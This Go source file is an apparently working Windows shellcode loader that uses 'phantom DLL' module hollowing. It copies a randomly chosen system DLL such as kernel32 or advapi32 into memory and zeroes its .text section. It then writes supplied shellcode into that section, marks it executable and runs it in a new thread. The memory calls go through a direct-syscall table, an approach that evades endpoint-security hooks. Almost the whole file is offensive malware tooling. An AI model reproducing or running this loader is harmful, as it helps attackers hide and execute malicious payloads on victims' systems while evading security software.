package main

import (
	"fmt"
	"unsafe"
	"strings"
	"math/rand"
	"time"
	"golang.org/x/sys/windows"
)

// PE format constants
const (
	IMAGE_DOS_SIGNATURE    = 0x5A4D      // MZ
	IMAGE_NT_SIGNATURE     = 0x00004550  // PE00
	IMAGE_SIZEOF_SHORT_NAME = 8
	
	IMAGE_SCN_MEM_EXECUTE  = 0x20000000
	IMAGE_SCN_MEM_READ     = 0x40000000
	IMAGE_SCN_MEM_WRITE    = 0x80000000
	
	IMAGE_DIRECTORY_ENTRY_EXPORT    = 0
	IMAGE_DIRECTORY_ENTRY_IMPORT    = 1
	IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
	
	DLL_PROCESS_ATTACH = 1
)

// Memory protection constants from windows package (for VirtualQueryEx)
const (
	PAGE_EXECUTE            = windows.PAGE_EXECUTE
	PAGE_EXECUTE_READ       = windows.PAGE_EXECUTE_READ
	PAGE_EXECUTE_READWRITE  = windows.PAGE_EXECUTE_READWRITE
	PAGE_EXECUTE_WRITECOPY  = windows.PAGE_EXECUTE_WRITECOPY
	PAGE_NOACCESS           = windows.PAGE_NOACCESS
	PAGE_READONLY           = windows.PAGE_READONLY
	PAGE_READWRITE          = windows.PAGE_READWRITE
	PAGE_WRITECOPY          = windows.PAGE_WRITECOPY
	PAGE_GUARD              = windows.PAGE_GUARD
	PAGE_NOCACHE            = windows.PAGE_NOCACHE
	PAGE_WRITECOMBINE       = windows.PAGE_WRITECOMBINE
)

// PE format structures
type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_SECTION_HEADER struct {
	Name                 [IMAGE_SIZEOF_SHORT_NAME]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

// PhantomDLL represents a hollowed DLL in memory
type PhantomDLL struct {
	Name                string
	BaseAddress         uintptr
	SizeOfImage         uint32
	EntryPoint          uintptr
	HollowedSection     *IMAGE_SECTION_HEADER
	SectionMapping      map[string]uintptr
	SyscallTable        *DynamicSyscallTable
	ShellcodeStartAddress uintptr // Store the actual shellcode start address
}

// Common legitimate DLLs that are typically loaded in most processes
var commonDLLs = []string{
	"C:\\Windows\\System32\\kernel32.dll",
	"C:\\Windows\\System32\\advapi32.dll",
	"C:\\Windows\\System32\\user32.dll",
	"C:\\Windows\\System32\\gdi32.dll",
	"C:\\Windows\\System32\\shell32.dll",
	"C:\\Windows\\System32\\ole32.dll",
	"C:\\Windows\\System32\\combase.dll",
	"C:\\Windows\\System32\\msvcrt.dll",
}

// NewPhantomDLL creates a new phantom DLL by loading and hollowing a legitimate DLL
func NewPhantomDLL(syscallTable *DynamicSyscallTable) (*PhantomDLL, error) {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	targetDLL := commonDLLs[rng.Intn(len(commonDLLs))]
	printDebug("[DEBUG] PhantomDLL: Selected DLL '%s' for hollowing.\n", targetDLL)
	
	phantom := &PhantomDLL{
		Name:           targetDLL,
		SectionMapping: make(map[string]uintptr),
		SyscallTable:   syscallTable,
	}
	
	printDebug("[DEBUG] PhantomDLL: Loading DLL...\n")
	err := phantom.loadDLL()
	if err != nil {
		return nil, fmt.Errorf("failed to load DLL: %v", err)
	}
	printDebug("[DEBUG] PhantomDLL: DLL loaded at base address 0x%x\n", phantom.BaseAddress)
	
	printDebug("[DEBUG] PhantomDLL: Finding hollowable section...\n")
	err = phantom.findHollowableSection()
	if err != nil {
		return nil, fmt.Errorf("failed to find hollowable section: %v", err)
	}
	sectionName := strings.TrimRight(string(phantom.HollowedSection.Name[:]), "\x00")
	printDebug("[DEBUG] PhantomDLL: Found section '%s' at RVA 0x%x for hollowing.\n", 
		sectionName, phantom.HollowedSection.VirtualAddress)

	printDebug("[DEBUG] PhantomDLL: Zeroing out section '%s' content...\n", sectionName)
	err = phantom.hollowSection()
	if err != nil {
		return nil, fmt.Errorf("failed to hollow section: %v", err)
	}
	printDebug("[DEBUG] PhantomDLL: Section '%s' successfully zeroed.\n", sectionName)
	
	return phantom, nil
}

// loadDLL loads the DLL into memory without executing its entry point
func (p *PhantomDLL) loadDLL() error {
	// Convert DLL path to UTF16
	dllPath, err := windows.UTF16PtrFromString(p.Name)
	if err != nil {
		return fmt.Errorf("failed to convert DLL path to UTF16: %v", err)
	}
	
	// Load the DLL as a data file first to avoid execution
	hFile, err := windows.CreateFile(
		dllPath,
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return fmt.Errorf("failed to open DLL file: %v", err)
	}
	defer windows.CloseHandle(hFile)
	
	// Create file mapping
	hMapping, err := windows.CreateFileMapping(hFile, nil, windows.PAGE_READONLY, 0, 0, nil)
	if err != nil {
		return fmt.Errorf("failed to create file mapping: %v", err)
	}
	defer windows.CloseHandle(hMapping)
	
	// Map view of the file
	fileView, err := windows.MapViewOfFile(hMapping, windows.FILE_MAP_READ, 0, 0, 0)
	if err != nil {
		return fmt.Errorf("failed to map view of file: %v", err)
	}
	defer windows.UnmapViewOfFile(fileView)
	
	// Parse PE headers
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(fileView))
	if dosHeader.E_magic != IMAGE_DOS_SIGNATURE {
		return fmt.Errorf("invalid DOS signature")
	}
	
	ntHeaders := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(fileView + uintptr(dosHeader.E_lfanew)))
	if ntHeaders.Signature != IMAGE_NT_SIGNATURE {
		return fmt.Errorf("invalid NT signature")
	}
	
	// Allocate memory for the DLL
	var baseAddress uintptr
	regionSize := uintptr(ntHeaders.OptionalHeader.SizeOfImage)
	err = p.SyscallTable.NtAllocateVirtualMemory(
		windows.CurrentProcess(),
		&baseAddress,
		0,
		&regionSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("failed to allocate memory for DLL: %v", err)
	}
	
	// Copy headers
	headerSize := uintptr(ntHeaders.OptionalHeader.SizeOfHeaders)
	copy((*[0x10000]byte)(unsafe.Pointer(baseAddress))[:headerSize], (*[0x10000]byte)(unsafe.Pointer(fileView))[:headerSize])
	
	// Copy sections
	sectionHeader := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(ntHeaders)) + uintptr(unsafe.Sizeof(IMAGE_NT_HEADERS64{}))))
	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		sectionName := strings.TrimRight(string(sectionHeader.Name[:]), "\x00")
		
		// Map section name to its address
		p.SectionMapping[sectionName] = baseAddress + uintptr(sectionHeader.VirtualAddress)
		
		// Copy section data if it has raw data
		if sectionHeader.PointerToRawData > 0 && sectionHeader.SizeOfRawData > 0 {
			sectionDest := baseAddress + uintptr(sectionHeader.VirtualAddress)
			sectionSource := fileView + uintptr(sectionHeader.PointerToRawData)
			sectionSize := uintptr(sectionHeader.SizeOfRawData)
			
			if sectionSize > 0 {
				// Use unsafe.Slice instead of fixed-size array conversion
				destSlice := unsafe.Slice((*byte)(unsafe.Pointer(sectionDest)), sectionSize)
				srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(sectionSource)), sectionSize)
				copy(destSlice, srcSlice)
			}
		}
		
		// Move to next section
		sectionHeader = (*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(sectionHeader)) + unsafe.Sizeof(IMAGE_SECTION_HEADER{})))
	}
	
	// Store DLL information
	p.BaseAddress = baseAddress
	p.SizeOfImage = ntHeaders.OptionalHeader.SizeOfImage
	p.EntryPoint = baseAddress + uintptr(ntHeaders.OptionalHeader.AddressOfEntryPoint)
	
	return nil
}

// findHollowableSection identifies a suitable section to hollow
func (p *PhantomDLL) findHollowableSection() error {
	// Get DOS header
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(p.BaseAddress))
	if dosHeader.E_magic != IMAGE_DOS_SIGNATURE {
		return fmt.Errorf("invalid DOS signature in memory")
	}
	
	// Get NT headers
	ntHeaders := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(p.BaseAddress + uintptr(dosHeader.E_lfanew)))
	if ntHeaders.Signature != IMAGE_NT_SIGNATURE {
		return fmt.Errorf("invalid NT signature in memory")
	}
	
	// Get first section header
	sectionHeader := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(ntHeaders)) + uintptr(unsafe.Sizeof(IMAGE_NT_HEADERS64{}))))
	
	// Iterate through sections
	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		sectionName := strings.TrimRight(string(sectionHeader.Name[:]), "\x00")
		
		// Look for a specific section like .text or choose based on characteristics
		// Let's prioritize .text section for simplicity
		if sectionName == ".text" {
			p.HollowedSection = sectionHeader
			return nil
		}
		
		// Move to next section
		sectionHeader = (*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(sectionHeader)) + unsafe.Sizeof(IMAGE_SECTION_HEADER{})))
	}
	
	// If .text not found, try finding any executable section
	sectionHeader = (*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(ntHeaders)) + uintptr(unsafe.Sizeof(IMAGE_NT_HEADERS64{}))))
	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		if sectionHeader.Characteristics&IMAGE_SCN_MEM_EXECUTE != 0 {
			p.HollowedSection = sectionHeader
			return nil
		}
		sectionHeader = (*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(sectionHeader)) + unsafe.Sizeof(IMAGE_SECTION_HEADER{})))
	}
	
	return fmt.Errorf("no suitable executable section found")
}

// hollowSection zeroes out the content of the selected section
func (p *PhantomDLL) hollowSection() error {
	if p.HollowedSection == nil {
		return fmt.Errorf("no section selected for hollowing")
	}
	
	sectionName := strings.TrimRight(string(p.HollowedSection.Name[:]), "\x00")
	sectionAddr := p.BaseAddress + uintptr(p.HollowedSection.VirtualAddress)
	sectionSize := uintptr(p.HollowedSection.VirtualSize)

	// Change protection to PAGE_READWRITE to allow zeroing
	var oldProtect uint32
	printDebug("[DEBUG] HollowSection: Setting %s protection to PAGE_READWRITE...\n", sectionName)
	errProtect := p.SyscallTable.NtProtectVirtualMemory(
		windows.CurrentProcess(),
		&sectionAddr, 
		&sectionSize,
		PAGE_READWRITE,
		&oldProtect,
	)
	printDebug("[DEBUG] HollowSection: NtProtectVirtualMemory finished. Error: %v\n", errProtect)
	if errProtect != nil {
		return fmt.Errorf("failed to change section protection to RW: %v", errProtect)
	}
	printDebug("[DEBUG] HollowSection: %s protection set to RW (Old: 0x%x).\n", sectionName, oldProtect)

	// Zero out the section content (Reverted to single write)
	printDebug("[DEBUG] HollowSection: Attempting to write %d zeros to address 0x%x\n", sectionSize, sectionAddr) 
	zeros := make([]byte, sectionSize) // Create a zero buffer
	var bytesWritten uintptr
	errWrite := p.SyscallTable.NtWriteVirtualMemory(
		windows.CurrentProcess(),
		sectionAddr,
		unsafe.Pointer(&zeros[0]),
		sectionSize,
		&bytesWritten,
	)
	if errWrite != nil || bytesWritten != sectionSize {
		printDebug("[DEBUG] HollowSection: Write failed or incomplete (wrote %d/%d). Syscall error: %v\n", bytesWritten, sectionSize, errWrite) 
		p.SyscallTable.NtProtectVirtualMemory(windows.CurrentProcess(), &sectionAddr, &sectionSize, oldProtect, &oldProtect)
		if errWrite == nil && bytesWritten != sectionSize {
			return fmt.Errorf("failed to write zeros: NtWriteVirtualMemory succeeded but wrote %d/%d bytes", bytesWritten, sectionSize)
		} else {
			return fmt.Errorf("failed to write zeros (wrote %d/%d): %v", bytesWritten, sectionSize, errWrite)
		}
	}
	printDebug("[DEBUG] HollowSection: Section zeroed successfully.\n") // Use color

	printDebug("[DEBUG] HollowSection: Leaving protection as PAGE_READWRITE for injection.\n") // Use color

	return nil
}

// InjectShellcode copies shellcode into the hollowed section and makes it executable
func (p *PhantomDLL) InjectShellcode(shellcode []byte) error {
	if p.HollowedSection == nil {
		return fmt.Errorf("no section selected for injection")
	}
	
	sectionAddr := p.BaseAddress + uintptr(p.HollowedSection.VirtualAddress)
	regionSize := uintptr(p.HollowedSection.VirtualSize) 
	shellcodeSize := uintptr(len(shellcode))
	
	if regionSize < shellcodeSize {
		return fmt.Errorf("shellcode size (%d) exceeds section virtual size (%d)", shellcodeSize, regionSize)
	}
	
	sectionName := strings.TrimRight(string(p.HollowedSection.Name[:]), "\x00")
	printDebug("[DEBUG] InjectShellcode: Preparing to inject %d bytes into section '%s' at 0x%x (VirtualSize: %d)\n", 
		shellcodeSize, sectionName, sectionAddr, regionSize)
	
	// Make section writable
	var oldProtectW uint32
	printDebug("[DEBUG] InjectShellcode: Setting protection to PAGE_READWRITE... (Original: 0x%x)\n", p.HollowedSection.Characteristics)
	err := p.SyscallTable.NtProtectVirtualMemory(
		windows.CurrentProcess(),
		&sectionAddr, 
		&regionSize, 
		uint32(PAGE_READWRITE),
		&oldProtectW,
	)
	if err != nil {
		return fmt.Errorf("InjectShellcode: failed to make section writable: %v", err)
	}
	printDebug("[DEBUG] InjectShellcode: Set protection to PAGE_READWRITE completed (Previous: 0x%x).\n", oldProtectW)
	
	// Copy shellcode
	printDebug("[DEBUG] InjectShellcode: Copying %d bytes of shellcode to 0x%x...\n", shellcodeSize, sectionAddr)
	var bytesWritten uintptr
	err = p.SyscallTable.NtWriteVirtualMemory(
		windows.CurrentProcess(), 
		sectionAddr,
		unsafe.Pointer(&shellcode[0]),
		shellcodeSize, 
		&bytesWritten,
	)
	if err != nil {
		return fmt.Errorf("InjectShellcode: NtWriteVirtualMemory failed: %v", err)
	}
	if bytesWritten != shellcodeSize {
		return fmt.Errorf("InjectShellcode: failed to write shellcode completely (wrote %d/%d bytes)", bytesWritten, shellcodeSize)
	}
	printDebug("[DEBUG] InjectShellcode: Shellcode copied successfully (%d bytes).\n", bytesWritten)

	// Make section executable
	var oldProtectX uint32
	printDebug("[DEBUG] InjectShellcode: Setting protection to PAGE_EXECUTE_READ...\n")
	err = p.SyscallTable.NtProtectVirtualMemory(
		windows.CurrentProcess(),
		&sectionAddr,
		&regionSize, 
		uint32(PAGE_EXECUTE_READ),
		&oldProtectX,
	)
	if err != nil {
		return fmt.Errorf("InjectShellcode: failed to make section executable: %v", err)
	}
	printDebug("[DEBUG] InjectShellcode: Set protection to PAGE_EXECUTE_READ completed (Previous: 0x%x).\n", oldProtectX)

	// Store the address where shellcode starts
	p.ShellcodeStartAddress = sectionAddr
	printDebug("[DEBUG] InjectShellcode: Stored shellcode start address: 0x%x\n", p.ShellcodeStartAddress)

	return nil
}

// GetShellcodeAddress returns the starting address of the injected shellcode
func (p *PhantomDLL) GetShellcodeAddress() uintptr {
	if p.ShellcodeStartAddress == 0 {
		printWarn("[WARN] GetShellcodeAddress called before shellcode was successfully injected or address is zero.\n")
	}
	return p.ShellcodeStartAddress
}

// ExecuteShellcode attempts to execute the injected shellcode directly (for testing)
func (p *PhantomDLL) ExecuteShellcode() error {
	if p.ShellcodeStartAddress == 0 {
		return fmt.Errorf("shellcode not injected or address not found")
	}

	printDebug("[DEBUG] ExecuteShellcode (PhantomDLL): Creating thread for shellcode at 0x%x...\n", p.ShellcodeStartAddress)
	var threadHandle windows.Handle
	err := p.SyscallTable.NtCreateThreadEx(
		&threadHandle,
		windows.GENERIC_ALL,
		0,
		windows.CurrentProcess(),
		p.ShellcodeStartAddress,
		0,
		0,
		0,
		0,
		0,
		0,
	)
	if err != nil {
		return fmt.Errorf("failed to create thread: %v", err)
	}
	printDebug("[DEBUG] ExecuteShellcode (PhantomDLL): Thread created (Handle: %d). Waiting...\n", threadHandle)

	// Wait for the thread to complete (optional)
	err = p.SyscallTable.NtWaitForSingleObject(threadHandle, false, nil)
	if err != nil {
		printWarn("[WARN] ExecuteShellcode (PhantomDLL): NtWaitForSingleObject failed: %v\n", err)
	}
	printDebug("[DEBUG] ExecuteShellcode (PhantomDLL): Thread execution likely finished.\n")

	// Close the thread handle
	err = p.SyscallTable.NtCloseWrapper(threadHandle)
	if err != nil {
		printWarn("[WARN] ExecuteShellcode (PhantomDLL): Failed to close thread handle %d: %v\n", threadHandle, err)
	}

	return nil
}

// Cleanup releases the allocated memory for the phantom DLL
func (p *PhantomDLL) Cleanup() error {
	if p.BaseAddress == 0 {
		return nil
	}
	printDebug("[DEBUG] Cleanup: Releasing phantom DLL memory at 0x%x\n", p.BaseAddress)
	err := windows.VirtualFree(
		p.BaseAddress, 
		0,
		windows.MEM_RELEASE,
	)
	p.BaseAddress = 0
	if err != nil {
		printWarn("[WARN] Cleanup: VirtualFree failed: %v\n", err)
		return fmt.Errorf("failed to free phantom DLL memory: %v", err) 
	}
	printDebug("[DEBUG] Cleanup: Phantom DLL memory released.\n")
	return nil
}

// protectionToString converts memory protection constants to human-readable strings
func protectionToString(protect uint32) string {
	var parts []string
	if protect == PAGE_NOACCESS {
		return "PAGE_NOACCESS"
	}
	if protect&PAGE_EXECUTE != 0 {
		parts = append(parts, "EXECUTE")
	}
	if protect&PAGE_READONLY != 0 {
		parts = append(parts, "READONLY")
	}
	if protect&PAGE_READWRITE != 0 {
		parts = append(parts, "READWRITE")
	}
	if protect&PAGE_WRITECOPY != 0 {
		parts = append(parts, "WRITECOPY")
	}
	if protect&PAGE_EXECUTE_READ != 0 {
		// Overrides EXECUTE and READONLY if present
		parts = removeProtectionPart(parts, "EXECUTE")
		parts = removeProtectionPart(parts, "READONLY")
		parts = append(parts, "EXECUTE_READ")
	}
	if protect&PAGE_EXECUTE_READWRITE != 0 {
		// Overrides EXECUTE, READONLY, READWRITE if present
		parts = removeProtectionPart(parts, "EXECUTE")
		parts = removeProtectionPart(parts, "READONLY")
		parts = removeProtectionPart(parts, "READWRITE")
		parts = append(parts, "EXECUTE_READWRITE")
	}
	if protect&PAGE_EXECUTE_WRITECOPY != 0 {
		// Overrides EXECUTE, READONLY, WRITECOPY if present
		parts = removeProtectionPart(parts, "EXECUTE")
		parts = removeProtectionPart(parts, "READONLY")
		parts = removeProtectionPart(parts, "WRITECOPY")
		parts = append(parts, "EXECUTE_WRITECOPY")
	}
	if protect&PAGE_GUARD != 0 {
		parts = append(parts, "GUARD")
	}
	if protect&PAGE_NOCACHE != 0 {
		parts = append(parts, "NOCACHE")
	}
	if protect&PAGE_WRITECOMBINE != 0 {
		parts = append(parts, "WRITECOMBINE")
	}

	if len(parts) == 0 {
		return fmt.Sprintf("UNKNOWN(0x%x)", protect)
	}
	return strings.Join(parts, " | ")
}

// removeProtectionPart removes a specific string part if present
func removeProtectionPart(parts []string, partToRemove string) []string {
	result := make([]string, 0, len(parts))
	for _, p := range parts {
		if p != partToRemove {
			result = append(result, p)
		}
	}
	return result
}
